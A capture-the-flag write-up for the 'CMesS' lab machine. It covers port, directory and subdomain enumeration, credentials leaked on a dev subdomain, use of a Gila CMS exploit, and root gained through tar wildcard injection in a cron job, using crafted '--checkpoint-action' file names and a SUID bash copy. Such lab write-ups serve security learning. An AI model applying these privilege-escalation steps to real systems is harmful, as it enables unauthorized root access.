# CMesS
> Silver Garcia

## Enumeration
Nmap
```bash
sudo nmap -T4 -A -p- 10.10.241.239
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 20:59 EDT
Nmap scan report for 10.10.241.239
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/29%OT=22%CT=1%CU=32163%PV=Y%DS=2%DC=T%G=Y%TM=6630
OS:4687%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=I%TS=8)SEQ(S
OS:P=108%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW
OS:7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%
OS:W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   246.10 ms 10.8.0.1
2   246.16 ms 10.10.241.239
```

Gobuster
```
gobuster dir --url http://10.10.241.239/ --wordlist /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.239/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/0                    (Status: 200) [Size: 3863]
/1                    (Status: 200) [Size: 4094]
/01                   (Status: 200) [Size: 4094]
/1x1                  (Status: 200) [Size: 4094]
/About                (Status: 200) [Size: 3347]
/about                (Status: 200) [Size: 3361]
/admin                (Status: 200) [Size: 1584]
/api                  (Status: 200) [Size: 0]
/assets               (Status: 301) [Size: 326] [--> http://10.10.241.239/assets/?url=assets]
/author               (Status: 200) [Size: 3602]
/blog                 (Status: 200) [Size: 3863]
/category             (Status: 200) [Size: 3874]
/cm                   (Status: 500) [Size: 0]
/feed                 (Status: 200) [Size: 735]
/fm                   (Status: 200) [Size: 0]
/index                (Status: 200) [Size: 3863]
/Index                (Status: 200) [Size: 3863]
/lib                  (Status: 301) [Size: 320] [--> http://10.10.241.239/lib/?url=lib]
/log                  (Status: 301) [Size: 320] [--> http://10.10.241.239/log/?url=log]
/login                (Status: 200) [Size: 1584]
/robots.txt           (Status: 200) [Size: 65]
/search               (Status: 200) [Size: 3863]
/Search               (Status: 200) [Size: 3863]
/server-status        (Status: 403) [Size: 278]
/sites                (Status: 301) [Size: 324] [--> http://10.10.241.239/sites/?url=sites]
/src                  (Status: 301) [Size: 320] [--> http://10.10.241.239/src/?url=src]                                                                               
/tags                 (Status: 200) [Size: 3147]
/tag                  (Status: 200) [Size: 3886]
/themes               (Status: 301) [Size: 326] [--> http://10.10.241.239/themes/?url=themes]                                                                         
/tmp                  (Status: 301) [Size: 320] [--> http://10.10.241.239/tmp/?url=tmp]                                                                               
```

subdomain enumeration with wfuzz
Command:
```bash
wfuzz -c --hw 290 -u 'http://cmess.thm' -H 'Host: FUZZ.cmess.thm' -w ~/Downloads/Subdomain.txt
```

Output:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 649649

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000015:   200        30 L     104 W      934 Ch      "dev"                                                                                                   
000000132:   400        12 L     53 W       422 Ch      "*.blog"                                                                                                
000000163:   400        12 L     53 W       422 Ch      "*.mail"                                                                                                
000000433:   400        12 L     53 W       422 Ch      "m."                                                                                                    
000000534:   400        12 L     53 W       422 Ch      "*.red"                                                                                                 
000000568:   400        12 L     53 W       422 Ch      "*.search"                                                                                              
000000539:   400        12 L     53 W       422 Ch      "*.dev"                                                                                                 
000000611:   400        12 L     53 W       422 Ch      "*.blogs"                                                                                               
000000604:   400        12 L     53 W       422 Ch      "*.staging"                                                                                             
000000782:   400        12 L     53 W       422 Ch      "*.s"                                                                                                   
000000783:   400        12 L     53 W       422 Ch      "*.b"                                                                                                   
000005388:   200        30 L     104 W      934 Ch      "dev" 
```

Added .dev to `/etc/hosts` file and got following text:
```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```

Could login to admin panel using found credentials `andre@cmess.thm:KPFTN_f2yxe%`

## Getting access
Got acces using followin exploit: https://www.exploit-db.com/exploits/51569

## Privilege escalation

SUID binaries
```
find / -perm -u=s -type f 2>/dev/null

/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ntfs-3g
/bin/fusermount
/bin/mount
/bin/ping6
/bin/su
/bin/ping
/bin/umount
```

Found credentials on `/opt/.password.bak`

```bash
cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

**Got SSH access with 'andre' user using and 'UQfsdCB7aAP6' password**

**Got root access using wildcard injection on crontab.**

1. Found crontab executing as root:
```
# m h dom mon dow user  command
17 * * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6 * * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

2. Added files on /home/andre/backup:
```
ls -la /home/andre/backup/
total 12
drwxr-x--- 2 andre andre 4096 May  2 19:52 .
drwxr-x--- 4 andre andre 4096 May  2 19:52 ..
-rw-rw-r-- 1 andre andre    0 May  2 19:48 --checkpoint=1
-rw-rw-r-- 1 andre andre    0 May  2 19:49 --checkpoint-action=exec=sh shell.sh
-rwxrwxr-x 1 andre andre   43 May  2 19:52 shell.sh
```

3. Set content of `shell.sh`:
```bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

4. Wait cron to get executed and got root executing:
```bash
/tmp/bash -p
```
